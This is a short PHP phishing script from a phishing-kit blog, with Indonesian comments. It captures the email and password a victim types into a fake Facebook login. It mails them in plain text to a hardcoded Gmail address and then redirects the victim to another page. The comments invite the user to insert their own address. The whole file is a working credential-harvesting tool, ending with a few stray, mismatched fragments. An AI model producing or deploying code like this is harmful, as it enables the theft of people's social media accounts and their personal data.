<?php
############################################
##        Author: Abdul aziz                  ##
##       Mailer: Lomen                    ##
##       Modifer: scriptpesing.blogspot.com  ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'Result Akun Pesbuk say';
$mailto = 'bocahceplak@gmail.com'; //masukin email lo disini

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['email'];
$paswot = $_POST['pass'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Email : <font color="green">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
EOD;


$headers = "From: info@Scriptpesing.com\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<head>
<meta http-equiv="Refresh" content="0; URL=processing.php"/>
</head>
<body>
</body>
</html>
';

?>